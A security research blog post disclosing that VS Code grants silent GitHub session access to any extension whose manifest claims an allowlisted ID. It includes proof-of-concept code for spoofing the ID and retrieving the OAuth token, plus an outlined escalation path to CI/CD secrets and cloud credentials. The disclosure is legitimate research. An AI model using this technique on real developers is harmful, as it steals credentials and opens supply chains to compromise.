---
layout: post
title: "VS Code Trusts an Extension's Name. That Includes Your GitHub Session"
date: "2026-07-31"
authors: ["joao_paulo_assis"]
categories: ["Security", "Hacking", "Bug Bounty", "Supply Chain Security"]
description:
thumbnail: "/assets/images/posts/joao-paulo/3/header.webp"
image: "/assets/images/posts/joao-paulo/3/header.webp"
comments: false

meta_title: "VS Code Trusts an Extension's Name. That Includes Your GitHub Session"
meta_description:
meta_image: "/assets/images/posts/joao-paulo/3/header.webp"
---

> An extension installed from a VSIX can claim the identity of an extension trusted by VS Code and inherit its silent access to an existing GitHub session.

## TL;DR

> VS Code keeps a list of extensions that may access existing authentication sessions without asking the user for per-extension consent. An extension installed from a VSIX can claim one of those trusted identities and receive the same treatment. I validated this with `github.vscode-pull-request-github`: with GitHub already signed in, the extension received the existing OAuth token, including `repo` and `workflow` scopes, without an authorization prompt. That ID is only the case I used for validation; the problem is the generic trust model. Microsoft closed the report as *By Design*, and the behavior remains present in the current version.

## Why VS Code extensions matter

Extensions are easy to underestimate because installing one feels like a normal part of using VS Code. Developers add formatters, themes, repository helpers, cloud integrations, AI assistants, and internal company tooling all the time. Behind that familiar interface, however, an extension runs on the same workstation where source code, terminals, credentials, deployment files, cloud configuration, and CI/CD access already live.

The delivery path does not need to look like an obvious attack either. A developer may install a VSIX sent by a teammate, use a private registry, test an internal package, follow instructions in a repository, or receive a malicious update to an extension that was legitimate when it was first installed. A compromised maintainer or publisher can turn an existing trusted workflow into the initial access vector.

That installation does not always need the developer's help. VS Code supports installing extensions through its [command-line interface](https://code.visualstudio.com/docs/configure/command-line), so an attacker who already has access to the workstation can install the package in the background, without opening the Extensions view or putting an installation prompt in front of the user. At that point, instead of dumping browser cookies and trying to recover a GitHub session from the browser, the attacker can use VS Code itself as the collection point: install the extension, retrieve the session already managed by the editor, and exfiltrate the OAuth token.

We have already seen what this looks like outside a lab. In May 2026, [GitHub disclosed](https://github.blog/security/investigating-unauthorized-access-to-githubs-internal-repositories/) that a poisoned third-party VS Code extension on an employee device led to the exfiltration of internal repositories. [Nx also documented](https://nx.dev/blog/nx-console-v18-95-0-postmortem) a malicious `Nx Console` release published through legitimate registries after a contributor's GitHub OAuth token was stolen. The March 2025 compromise of `tj-actions/changed-files` showed the other side of the same problem: once an attacker reaches the development or CI/CD trust chain, thousands of repositories can become part of the blast radius ([GitHub advisory](https://github.com/advisories/GHSA-mrrh-fwg8-r2c3)).

That context is why I started looking beyond the obvious fact that extensions can execute code. VS Code also gives extensions access to internal services such as authentication, and it does not treat every extension equally. Some callers must ask before receiving an existing account session; others are trusted by default. The interesting question is therefore not whether an extension can run JavaScript. It is how VS Code decides which extension is trusted enough to receive an account token without asking the user.

## Tested Environment

This is not a "worked on 1.128.0 and was later fixed" story. Microsoft considers the behavior *By Design*, and it remains present in the current version. I list the build below because it is the one I used for the video, source references, and reproducible output:

```text
Visual Studio Code 1.128.0 Stable x64
Commit: fc3def6774c76082adf699d366f31a557ce5573f
Operating system: Windows
```

For static analysis, I used the local VS Code source tree at:

```text
bc9ab02681fa12d2a26f42bb8703a73802ecf166
```

The relevant authentication path mainly runs through:

```text
src/vs/workbench/api/common/extHostAuthentication.ts
src/vs/workbench/api/browser/mainThreadAuthentication.ts
src/vs/workbench/services/authentication/browser/authenticationAccessService.ts
product.json
```

## The trusted authentication allowlist

VS Code ships a configuration named `trustedExtensionAuthAccess` in `product.json`. It contains extension IDs that may access sessions from a given authentication provider without going through the normal per-extension consent flow.

At the time of writing, the `github` provider includes:

```json
{
  "trustedExtensionAuthAccess": {
    "github": [
      "vscode.github",
      "github.remotehub",
      "ms-vscode.remote-server",
      "github.vscode-pull-request-github",
      "github.codespaces",
      "github.copilot",
      "github.copilot-chat",
      "ms-vsliveshare.vsliveshare",
      "ms-azuretools.vscode-azure-github-copilot"
    ]
  }
}
```

For an ordinary extension, VS Code stores an allow-or-deny decision for each provider, account, and extension ID. Even when the user is already signed in, a new extension does not automatically receive that session. VS Code adds an access request to the Accounts menu and asks whether the extension may use the selected account.

An ID in `trustedExtensionAuthAccess` skips that step. This is not special logic written only for GitHub Pull Requests, Copilot, Codespaces, or any other individual entry. The access service performs the same membership check for every ID in the provider list.

## How authentication access normally works

Extensions use `vscode.authentication.getSession(providerId, scopes, options)` as an authentication broker. The provider handles login, account discovery, session creation, and token storage. The consumer extension asks VS Code for a compatible session instead of implementing its own OAuth flow.

A GitHub integration, for example, can receive an `AuthenticationSession`, use its token to call the GitHub API, and let VS Code handle account selection and access records.

Caller identity matters here because the provider owns the credential, but the requesting extension receives it. VS Code carries the requester's `extensionId` through the authentication path and checks whether that caller may access the selected session.

When an existing session has not been approved for an ordinary extension, the default flow creates an action under the Accounts menu:

```text
Grant access to GitHub for <Extension Name>... (1)
```

Opening it leads to the consent dialog:

```text
The extension '<Extension Name>' wants to access
the GitHub account '<Account Name>'.

[Allow] [Deny]
```

The choice is then stored for later requests. When the extension uses `{ silent: true }`, VS Code suppresses that UI. An ordinary extension without prior approval simply receives `undefined`; the silent option is not supposed to grant access by itself.

## Where the trust check goes wrong

For a VSIX package, the runtime extension ID comes from two fields in `package.json`:

```json
{
  "name": "vscode-pull-request-github",
  "publisher": "github"
}
```

VS Code combines them as:

```text
github.vscode-pull-request-github
```

Those fields are controlled by whoever builds the package. `displayName` does not affect the authorization decision; it is only presentation text.

When an extension asks for a session, `extHostAuthentication.ts` normalizes that declared identity and sends it to the Main Thread:

```ts
const extensionId = ExtensionIdentifier.toKey(requestingExtension.identifier);

return await this._getSessionTaskSingler.getOrCreate(singlerKey, async () => {
  await this._proxy.$ensureProvider(providerId);
  const extensionName = requestingExtension.displayName || requestingExtension.name;
  return this._proxy.$getSession(
    providerId,
    scopesOrRequest,
    extensionId,
    extensionName,
    options
  );
});
```

`extensionName` is used in the UI. `extensionId` reaches the access-control decision. What does not travel with it is the important part: there is no package signature, immutable Marketplace identity, installation source, or proof that the artifact is the official package expected to own that ID.

In `mainThreadAuthentication.ts`, existing sessions are returned only after `AuthenticationAccessService.isAccessAllowed()` approves the caller. The same check is used whether VS Code finds a preferred account or filters the available sessions:

```ts
if (
  matchingAccountPreferenceSession &&
  this.authenticationAccessService.isAccessAllowed(
    providerId,
    matchingAccountPreferenceSession.account.label,
    extensionId
  )
) {
  return matchingAccountPreferenceSession;
}
```

```ts
const validSessions = sessions.filter(session =>
  this.authenticationAccessService.isAccessAllowed(
    providerId,
    session.account.label,
    extensionId
  )
);

if (validSessions.length === 1) {
  return validSessions[0];
}
```

The trust shortcut itself is in `authenticationAccessService.ts`:

```ts
isAccessAllowed(
  providerId: string,
  accountName: string,
  extensionId: string
): boolean | undefined {
  const trustedExtensionAuthAccess =
    this._productService.trustedExtensionAuthAccess;
  const extensionKey = ExtensionIdentifier.toKey(extensionId);

  if (Array.isArray(trustedExtensionAuthAccess)) {
    if (trustedExtensionAuthAccess.includes(extensionKey)) {
      return true;
    }
  } else if (
    trustedExtensionAuthAccess?.[providerId]?.includes(extensionKey)
  ) {
    return true;
  }

  const allowList = this.readAllowedExtensions(providerId, accountName);
  // Normal persisted-consent flow
}
```

The product allowlist is checked before the user's stored consent records. A matching string causes an immediate `return true`.

This branch does not verify:

* a Marketplace UUID or another immutable package identity;
* a VSIX signature;
* verified-publisher metadata;
* the installation source;
* whether the installed artifact is the official package associated with that ID.

In practice, the package supplies the identity and the allowlist trusts it.

## Validating the Behavior

To validate this point, I created two test extensions, packaged each one as a VSIX, and installed them manually. Both make the same authentication request.

The control package uses an ordinary identity:

```json
{
  "name": "normal-auth-consumer",
  "publisher": "lab"
}
```

VS Code sees it as:

```text
lab.normal-auth-consumer
```

The second package uses manifest values that produce one of the IDs already present in the GitHub allowlist:

```json
{
  "name": "vscode-pull-request-github",
  "publisher": "github"
}
```

VS Code sees it as:

```text
github.vscode-pull-request-github
```

Both packages run the same call:

```js
const session = await vscode.authentication.getSession(
  'github',
  [],
  { silent: true }
);
```

I exposed the test through commands only to make the video easier to follow. The request can also run directly from `activate()` after any matching activation event:

```js
async function activate(context) {
  const session = await vscode.authentication.getSession(
    'github',
    [],
    { silent: true }
  );

  if (!session) {
    return;
  }

  await githubApiGet('/user', session.accessToken);
}
```

With GitHub already signed in, the control extension receives the expected result:

```text
activate() called
extension.id=lab.normal-auth-consumer
silent result: undefined
```

Using the allowlisted identity, the exact same request returns the existing GitHub session:

```text
activate() called
extension.id=github.vscode-pull-request-github
silent result: session id=<redacted>, account=<redacted>,
scopes=["read:user","user:email","repo","workflow"]
```

I did not use `createIfNone`, trigger a new login, approve the extension, attach a debugger, hook the process, or modify the VS Code binary. The difference is the ID presented to the access service.

## The returned session includes the token

`AuthenticationSession` is not just a flag saying that the user is logged in. The object contains the OAuth bearer token:

```ts
interface AuthenticationSession {
  readonly id: string;
  readonly accessToken: string;
  readonly account: AuthenticationSessionAccount;
  readonly scopes: readonly string[];
}
```

I used `session.accessToken` against the GitHub API in the same way a legitimate consumer extension would:

```js
const request = https.request({
  hostname: 'api.github.com',
  path: '/user',
  method: 'GET',
  headers: {
    Accept: 'application/vnd.github+json',
    Authorization: `Bearer ${session.accessToken}`,
    'User-Agent': 'vscode-auth-research',
    'X-GitHub-Api-Version': '2022-11-28'
  }
});
```

The PoC records token presence, a short fingerprint, its length, and the API response while keeping the sensitive values redacted:

```js
log(
  `session received: id=${redact(session.id)}, ` +
  `account=${redact(session.account.label)}, ` +
  `scopes=${JSON.stringify(session.scopes)}`
);
log(
  `token proof: present=${Boolean(session.accessToken)}, ` +
  `sha256_16=${tokenFingerprint(session.accessToken)}, ` +
  `length=${session.accessToken.length}`
);

const user = await githubApiGet('/user', session.accessToken);
log(
  `GET /user => status=${user.statusCode}, ` +
  `x-oauth-scopes=${JSON.stringify(
    parseScopesHeader(user.headers['x-oauth-scopes'])
  )}`
);
```

GitHub accepts the credential:

```text
session received: id=<redacted>, account=<redacted>,
scopes=["read:user","user:email","repo","workflow"]

token proof: present=true, sha256_16=<redacted>, length=40

GET /user => status=200,
x-oauth-scopes=["read:user","repo","user:email","workflow"]
GET /user proof => login=<redacted>, id_present=true

GET /user/emails?per_page=1 => status=200, returned_count=1
GET /user/emails proof => primary_present=true, verified_present=true

GET /user/repos?visibility=private&per_page=1 => status=200,
returned_count=0, private_repo_visible=false
```

The account used for the test had no visible private repositories, so that endpoint returned zero items. The relevant result is that GitHub returns `200` and reports the scopes carried by the token.

## Video Demonstration

[Watch the demonstration directly on Vimeo](https://vimeo.com/1212364028)

## Offensive Impact

At this point, this stops being a small consent-UI issue. The session I received contains:

| Scope | What it allows |
|----|----|
| `read:user` | Read the GitHub account profile. |
| `user:email` | Read the account's email addresses. |
| `repo` | Access repositories permitted by the token, including private repositories. |
| `workflow` | Read and update GitHub Actions workflow files within the token's permissions. |

With `repo`, an attacker may reach private source code, deployment manifests, Terraform modules, internal addresses, commit history, and credentials that found their way into a repository. Even when there is no secret committed directly, the repository often explains how the environment is built and where the next target lives.

The `workflow` scope makes the CI/CD angle more interesting. Where repository permissions, branch protections, and workflow rules allow it, modifying `.github/workflows` can expose the `GITHUB_TOKEN`, repository or environment secrets, deployment credentials, and build artifacts. GitHub documents stolen credentials being used to add malicious workflows in [Hardening repositories against credential theft](https://github.blog/security/hardening-repositories-against-credential-theft/).

From there, self-hosted runners and OIDC can expand the impact. A self-hosted runner may have internal network access, cached credentials, SSH keys, API tokens, or access to cloud metadata. A workflow using [OIDC federation](https://docs.github.com/en/actions/concepts/security/openid-connect) may exchange a GitHub-issued token for temporary AWS, Azure, GCP, or other cloud credentials. GitHub's [secure use reference](https://docs.github.com/en/actions/reference/security/secure-use#hardening-for-self-hosted-runners) warns about the persistence and secret-exposure risks of self-hosted runners. In [Abusing GitHub Actions to Compromise AWS Accounts](https://article.pacificsec.com/blog/2025-02-03-abusing-github-actions-to-compromise-aws-accounts/), we show how this entire chain can be exploited and the risks it creates.

A realistic chain can look like this:

```text
malicious or poisoned extension
        ↓
allowlisted extension identity
        ↓
existing GitHub OAuth token
        ↓
private repositories or workflow access
        ↓
CI/CD secrets, runners, or OIDC cloud credentials
        ↓
internal or cloud infrastructure
```

The later steps depend on the victim's permissions and the company's controls. This behavior does not create a GitHub account session or mint a new token; it reuses one that already exists in VS Code. That limitation matters, but so does the fact that the extension receives the real bearer credential without the consent VS Code normally requires from a new caller.

## Complete PoC and extension code

[Watch the demonstration directly on Vimeo](https://vimeo.com/1214328808)

<https://github.com/j0hnZ3RA/vscode-ghtoken-exfil>

## Practical constraints and Other IDs

The authorization check is generic, but that does not mean every allowlisted ID is equally easy to use in practice. A compatible session must already exist, and the test extension must successfully run under the chosen identity.

I tested two IDs from the GitHub allowlist:

* `github.vscode-pull-request-github` could be installed and executed under the expected ID, so I used it for the working PoC;
* `github.copilot-chat` collided with the Copilot Chat component already shipped with VS Code. The test extension did not appear as a separate package, so I could not isolate a clean test under that ID.

That Copilot result is not an authorization denial. The package collides earlier in VS Code's extension-management layer because two artifacts claiming the same `publisher.name` compete for the same internal identity.

The Marketplace creates another practical issue. It also recognizes `github.vscode-pull-request-github` as the official package ID. With auto-update enabled, VS Code treats the official release as an update and replaces the manually installed test package. I disabled auto-update in the test profile to keep the PoC stable.

So the claim here is not that every entry in `trustedExtensionAuthAccess` is equally exploitable. The claim is narrower and directly supported by the code: once a package runs under an ID present in the provider's allowlist, the authentication service applies the same early trust decision without checking package provenance.

## Conclusion

I reported this behavior to the Microsoft Security Response Center. Microsoft closed it as *By Design*, because extension code already runs as Node.js with the user's capabilities and VS Code does not treat extensions as a security boundary.

I understand that argument as a servicing rule, but it does not match what the product itself is doing. VS Code keeps per-extension account permissions, shows consent prompts, and maintains a special list of extensions allowed to skip those prompts. That only makes sense if the identity of the requesting extension matters.

If the identity does not matter, the allowlist and consent model are mostly theater. If it does matter, letting the package prove its identity with a name from its own manifest is not much of a verification step.

Calling the behavior *By Design* does not resolve that contradiction. It just turns the contradiction into a feature.
